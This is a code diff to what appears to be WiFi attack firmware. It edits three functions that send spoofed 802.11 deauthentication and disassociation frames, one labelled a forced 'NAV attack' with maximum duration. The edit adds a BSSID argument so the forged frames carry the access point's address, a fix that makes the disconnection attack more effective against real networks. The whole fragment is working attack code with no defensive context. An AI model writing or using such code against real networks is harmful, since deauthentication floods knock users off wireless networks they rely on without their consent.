@@ -28,33 +28,33 @@ void wifi_tx_raw_frame(void* frame, size_t length) {
  * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the deauth
  * @param reason A reason code according to the 802.11 spec. Optional 
 */
-void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
+void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason, void* bssid) {
   if (src_mac == nullptr || dst_mac == nullptr) return;
   DeauthFrame frame;
-  memcpy(&frame.source, src_mac, 6);
-  memcpy(&frame.access_point, src_mac, 6);
-  memcpy(&frame.destination, dst_mac, 6);
+  memcpy(&frame.source,       src_mac, 6);
+  memcpy(&frame.access_point, bssid ? bssid : src_mac, 6);  // FIX: BSSID = AP MAC
+  memcpy(&frame.destination,  dst_mac, 6);
   frame.reason = reason;
   wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
 }
 
-void wifi_tx_deauth_nav(void* src_mac, void* dst_mac, uint16_t reason) {
+void wifi_tx_deauth_nav(void* src_mac, void* dst_mac, uint16_t reason, void* bssid) {
   if (src_mac == nullptr || dst_mac == nullptr) return;
   DeauthFrame frame;
   frame.duration = 0xFFFF; // Force NAV attack duration
-  memcpy(&frame.source, src_mac, 6);
-  memcpy(&frame.access_point, src_mac, 6);
-  memcpy(&frame.destination, dst_mac, 6);
+  memcpy(&frame.source,       src_mac, 6);
+  memcpy(&frame.access_point, bssid ? bssid : src_mac, 6);  // FIX: BSSID = AP MAC
+  memcpy(&frame.destination,  dst_mac, 6);
   frame.reason = reason;
   wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
 }
 
-void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason) {
+void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason, void* bssid) {
   if (src_mac == nullptr || dst_mac == nullptr) return;
   DisassocFrame frame;
-  memcpy(&frame.source, src_mac, 6);
-  memcpy(&frame.access_point, src_mac, 6);
-  memcpy(&frame.destination, dst_mac, 6);
+  memcpy(&frame.source,       src_mac, 6);
+  memcpy(&frame.access_point, bssid ? bssid : src_mac, 6);  // FIX: BSSID = AP MAC
+  memcpy(&frame.destination,  dst_mac, 6);
   frame.reason = reason;
   wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
 }
